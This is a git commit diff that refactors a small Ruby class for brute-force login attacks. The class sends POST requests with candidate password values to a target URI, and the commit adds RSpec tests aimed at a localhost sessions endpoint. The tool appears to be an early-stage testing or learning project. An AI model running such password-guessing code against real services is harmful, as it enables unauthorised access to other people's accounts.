9b3c5c8accfaca8ef3adeee0347faff5ace2bd26
Jeremy Fox <foxjerem@gmail.com>
2014-10-30 16:31:20 +0000

    added test for launch

--- attacks/brute_force.rb
+++ attacks/brute_force.rb
@@ -3,20 +3,21 @@ require 'net/http'
 class BruteForceAttack
 
   attr_reader   :target_uri, :target_req
-  attr_accessor :payloads
+  attr_accessor :payloads, :responses
 
   def initialize(target_uri)
     @target_uri = URI.parse(target_uri)
     @target_req = set_target_req
-    @payloads = []
+    @payloads   = []
+    @responses  = []
   end
 
   def launch!
     @payloads.each do |payload|
       payload.param_values.map do |value| 
-        req = target_req.clone
-        req.set_form_data(payload.param_key => value)
-        Net::HTTP.start(target_uri.hostname, target_uri.port){ |http| http.request(req) }
+        req = create_req_from_payload(payload, value)
+        # puts req.to_yaml
+        send_http_request(req)
       end
     end
   end
@@ -25,6 +26,16 @@ class BruteForceAttack
 
   def set_target_req
     Net::HTTP::Post.new(target_uri)  
+  end
+
+  def send_http_request(req)
+    Net::HTTP.start(target_uri.hostname, target_uri.port){ |http| http.request(req) }
+  end
+
+  def create_req_from_payload(payload, value)
+    req = target_req.clone
+    req.set_form_data(payload.param_key => value)
+    req
   end
 
 end
--- spec/attack/brute_force_spec.rb
+++ spec/attack/brute_force_spec.rb
@@ -1,7 +1,8 @@
 describe BruteForceAttack do
   
-  let(:uri)     { 'http://localhost:9292/sessions/'   }
-  let(:attack)  { BruteForceAttack.new(uri)           }
+  let(:uri)     { 'http://localhost:9292/sessions/'                                }
+  let(:attack)  { BruteForceAttack.new(uri)                                        }
+  let(:payload) { double Payloads, param_key: 'password', param_values: ['12345678'] }
 
   context 'initialization' do
 
@@ -18,17 +19,38 @@ describe BruteForceAttack do
       expect(attack.payloads).to eq []
     end
 
+    it 'should have no responses intially' do
+      expect(attack.responses).to eq []
+    end
+
   end
 
   context 'payloads' do
-
-    let(:payload) { double Payloads, post_key: 'password', post_values: ['12345678'] }
 
     it 'payloads can be added' do
       attack.payloads << payload
       expect(attack.payloads).to eq [payload]
     end
   
+  end
+
+  context 'launching an attack' do
+
+    let(:req)     { double Net::HTTP::Post      }
+    before(:each) { attack.payloads << payload  }
+
+    it 'can generate a set of http requests from a payload' do
+      expect(attack).to receive(:create_req_from_payload)
+          .with(attack.payloads.first, '12345678')
+          .and_return(req)
+      expect(attack).to receive(:send_http_request).with(req)
+      attack.launch!
+    end
+
+    it 'returns the responses for each request' do
+
+    end
+
   end
 
 end
